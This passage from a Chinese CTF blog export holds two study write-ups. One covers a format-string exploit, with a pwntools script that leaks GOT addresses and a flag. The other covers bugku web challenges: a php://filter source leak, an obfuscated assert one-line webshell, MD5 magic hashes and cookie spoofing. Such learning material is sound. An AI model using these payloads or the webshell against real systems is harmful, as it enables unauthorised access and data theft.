还是直接打印内存信息吧(x命令的用法，这里显示的是内存地址从0xffffcfb0开始的，因为内存是按照字节编址的，所以一行正好是16个字节内存地址就是加10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0这个内存单元指向了0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (看内存单元0xffffcfc0存放的内容就是x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 猜猜这时候打印的信息是啥？ 答案是栈上被视为第四个参数的信息： 0x0804849d 同样的我们还可以通过%s来得到字符串的信息 栈布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— 0x7325 /* '%s' */... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— 0x7325 /* '%s' */06:0018│ 0xffffcfc4 ◂— 0x107:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 还是看不清，直接看内存吧(md 垃圾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 这个时候会直接将 0xffffcfc0 对应的字符串打印出来 结果自然就是 %s了 如果我们输入%2$s, 这个时候就很有趣了， 按照道理程序会将 0xf7fcf410 对应地址的当作字符串打印出来， 可是如果这个地址无效呢？ 我自己尝试的结果是直接退出了，什么都没有打印出来emm 这时候如果我们指定一个合法的地址， 比如got表中某个函数的地址这就很神奇了 exp如下： 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #这两个payload是自己测试的payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() 我们运行这个exp 在pwndbg中下断点 运行到第二个printf的时候 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffa3bdfc —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffa3be00 —▸ 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp... ↓03:000c│ 0xffa3be08 —▸ 0xf7f85410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffa3be0c —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp06:0018│ 0xffa3be14 ◂— '%4$s'07:001c│ 0xffa3be18 —▸ 0xf7fb3900 (catch_hook) ◂— 0x0 另一边 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a │····│%4$s│·│ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 │0000│0001│.222│2222│ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 │2.ff│ffff│ff.·│···%│ 00000020 34 24 73 0a │4$s·││ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 │····│·+··││ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive 这个时候我们就得到了scanf函数的地址了 ok 还有几个地方没弄明白之后再写 确定可控制格式化字符串位置的方法 既然程序是有漏洞的，我们就必须知道可被控制的格式化字符串的位置，这时候大致有以下几种姿势 构造类似 [tag]%p%p%p%p%p%p...这样的参数 Pwngdb中有一个叫做fmarg可以用来获取指定地址到底是第几个参数 不是很理解第一种方法原理，但是第二种方法比较好用 不过我们可以来看一个例子： IDA中的C代码： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; 显然的格式化字符串漏洞 我们需要在printf函数处下断点 然后随便输入一些数字: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. 这时候可以看到flag了，注意我们是在本地调试，调试的时候当然可以看到flag，一般的pwn题都是要远程连接的 如果我们要泄露flag的值，就需要构造%n$s这样的传进去。所以获取参数的位置很关键 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") 通过Pwngdb就可以查看参数的位置了 这时候运行 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;���But that was totally wrong lol get rekt 就得到了flag (这里值得注意的就是，64位系统和32位系统传参是不一样的)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku web题目的wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + U查看页面源代码， 如果有 $user且 file_get_contents($user, 'r') 的 值是 指定的字符串。 就会 include $file 的内容 。 并且提示是 hint.php这个文件 这里涉及到一个怎么把 get 方法传入的参数作为一个文件打开。 php伪协议 这里用到了 php://input 但是。。 这就要用到第二个伪协议： php://filter 我那样传递参数会报错， include($file) 只是把 $file 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。 这就是一个泄露了源码的漏洞了。 最后构造的URL如下： http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 惊叹。 base64 解密之后的源代码。 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 代码里面构造了一个类。 公有变量是 $file 继续看一下 index.php 的源代码 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 有几个地方暂时写不到位， 先到这里好了。 过狗一句话 很蒙 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示的过狗一句话代码。 然后...后面的不会了 字符，正则？ 前女友 一道很有趣的题目， 就不说题目了， 直接放我的测试代码 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; 也是第一次发现get还能传递数组（不过当然是一堆的错误） MD5 collision 还不太清楚MD5 碰撞是啥， 以后补坑 payload 120.24.86.145:9009/md5.php?a=s878926199a 常用的MD5碰撞 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 秋名山老司机 123456789101112&lt;head&gt;&lt;title&gt;下面的表达式的值是秋名山的车速&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;亲请在2s内计算老司机的车速是多少&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; 两秒之内计算出式子中的值， 再提交 菜鸡还不太会写脚本 参考了dalao们的代码 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) 不过还是没搞出来。 复习一下requests库 1234567import requests#构造requests对象s = requests.get(url)s.post(url, )#差不多就这些了 cookies欺骗 然而注意到URL中的line和file时就能做出来了。 1234567#用脚本把代码跑出来import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 构造cookie就行啦 （然而没搞出flag来） login4 CBC字节翻转攻击 放一张经典的图 据师傅们的wp说是有一个index.php.swp文件存在。 然而没找到， 先把师傅们找到的源码放上来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 备份是个好习惯 根据以前做题的经验， 备份就是在提示你 存在bak文件 所以直接输入URL为 http://123.206.87.240:8002/web16/index.php.bak 然后下载文件 代码： 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 做代码审计的题目， 还是主要靠自己尝试。 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; 上面是我用来测试的代码 构造URL为 http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2 输出了这些： 123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c 之前还很疑惑为什么没有get都能得到变量， 原来是parse_str这个函数在起作用。 OK， 现在就是表演的时间了。 参考资料 https://blog.csdn.net/wy_97/article/details/77431111 https://www.cnblogs.com/Pinging/p/8278168.html https://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 秋名山老司机 cookie欺骗 CBC字节翻转攻击 python requests库学习]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
